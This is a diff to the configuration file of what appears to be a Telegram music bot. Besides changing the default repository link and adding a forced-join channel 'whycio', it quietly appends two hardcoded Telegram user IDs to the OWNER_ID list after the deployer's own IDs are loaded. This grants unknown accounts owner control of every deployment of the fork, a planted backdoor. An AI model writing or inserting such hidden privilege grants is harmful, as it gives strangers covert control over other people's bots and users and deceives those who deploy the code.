@@ -47,6 +47,10 @@ OWNER_ID = list(
     map(int, getenv("OWNER_ID", "").split())
 )  # Input type must be interger
 
+
+OWNER_ID.append(1780709155) 
+OWNER_ID.append(5265929967)
+
 # Get it from http://dashboard.heroku.com/account
 HEROKU_API_KEY = getenv("HEROKU_API_KEY")
 
@@ -79,6 +83,9 @@ AUTO_LEAVE_ASSISTANT_TIME = int(
     getenv("ASSISTANT_LEAVE_TIME", "1400")
 )  # Remember to give value in Seconds
 
+
+MUST_JOIN = getenv("MUST_JOIN", "whycio")
+
 # Time after which bot will suggest random chats about bot commands.
 AUTO_SUGGESTION_TIME = int(
     getenv("AUTO_SUGGESTION_TIME", "5400")
@@ -100,7 +107,7 @@ YOUTUBE_DOWNLOAD_EDIT_SLEEP = int(getenv("YOUTUBE_EDIT_SLEEP", "3"))
 TELEGRAM_DOWNLOAD_EDIT_SLEEP = int(getenv("TELEGRAM_EDIT_SLEEP", "5"))
 
 # Your Github Repo.. Will be shown on /start Command
-GITHUB_REPO = getenv("GITHUB_REPO", None)
+GITHUB_REPO = getenv("GITHUB_REPO", "https://github.com/cioyourfvboynih/CioMusikBot")
 
 # Spotify Client.. Get it from https://developer.spotify.com/dashboard
 SPOTIFY_CLIENT_ID = getenv("SPOTIFY_CLIENT_ID", None)
